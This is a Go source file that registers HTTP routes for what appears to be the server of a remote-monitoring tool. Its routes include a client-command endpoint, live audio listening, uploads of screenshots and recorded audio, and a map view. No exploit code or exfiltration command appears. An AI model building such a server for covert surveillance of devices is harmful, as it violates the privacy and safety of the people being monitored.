package service

import (
	"net/http"
	"time"

	"github.com/gorilla/mux"
)

func RegisterRoutes(r *mux.Router, s *Service) {

	//ws
	r.HandleFunc("/ws", s.wsHandler)

	//client routes
	r.HandleFunc("/", s.clientsHandler)
	r.HandleFunc("/client", s.clientHandler)
	r.HandleFunc("/clients", s.clientsHandler)
	r.HandleFunc("/clientmetrics", s.clientMetricsHandler)
	r.HandleFunc("/clientappsdata", s.clientAppsDataHandler)
	r.HandleFunc("/wsAudio", s.wsAudioHandler)
    r.HandleFunc("/wsAudioListen", s.wsAudioListenHandler)
	r.HandleFunc("/download/client", s.downloadClientHandler)

	//for upload
	uploader := r.PathPrefix("/upload").Subrouter()
	uploader.HandleFunc("/", s.uploadHandler)
	uploader.HandleFunc("/screenshot", s.uploadScreenshotHandler)
	uploader.HandleFunc("/audio", s.uploadAudioHandler)
	uploader.HandleFunc("/recorded_audio", s.uploadRecordedAudioHandler)

	//some funcs
	r.HandleFunc("/command", s.commandHandler)
	r.HandleFunc("/api/time", timeHandler)
	r.HandleFunc("/map", s.mapHandler)

	// r.Handle("/uploads", http.StripPrefix("/uploads/", http.FileServer(http.Dir(s.uploadPath))))
	r.PathPrefix("/uploads/").Handler(
		http.StripPrefix("/uploads/", http.FileServer(http.Dir(s.uploadPath))),
	)
}

func timeHandler(w http.ResponseWriter, r *http.Request) {
	currentTime := time.Now().UTC().Format(time.RFC3339)
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(currentTime))
}
